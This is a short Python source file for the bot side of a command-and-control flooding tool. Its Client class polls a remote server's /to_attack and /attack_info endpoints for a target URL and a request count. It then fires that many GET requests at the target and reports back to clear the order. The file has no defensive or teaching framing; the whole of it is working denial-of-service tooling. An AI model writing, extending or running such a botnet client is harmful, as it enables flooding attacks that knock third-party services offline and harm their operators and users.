import requests as r


class Client:

    def __init__(self, server_address: str) -> None:
        self.server_address = server_address

    def get_attack_info(self) -> tuple:
        rsp = r.get(f"http://{self.server_address}/attack_info")
        content = rsp.json()
        if rsp.status_code == 200 and content["attack_address"] and content["requests_amount"]:
            return content["attack_address"], int(content["requests_amount"])
        else:
            print("No attack info")
            return None, None

    @staticmethod
    def attack(attack_address: str, num_requests: int) -> None:
        for _ in range(num_requests):
            rsp = r.get(attack_address)
            print(rsp.status_code, rsp.elapsed)

    def get_command(self) -> str | None:
        try:
            rsp = r.get(f"http://{self.server_address}/to_attack")
        except r.exceptions.ConnectionError:
            print("Connection to server failed")
            return None

        if rsp.status_code == 200:
            return rsp.json()["to_attack"]
        else:
            return None

    def run(self):
        while True:
            to_attack = self.get_command()
            if to_attack:
                attack_address, num_requests = self.get_attack_info()
                if attack_address and num_requests:
                    self.attack(attack_address, num_requests)
                    r.post(f"http://{self.server_address}/to_attack", json={"to_attack": "no"})
                else:
                    continue
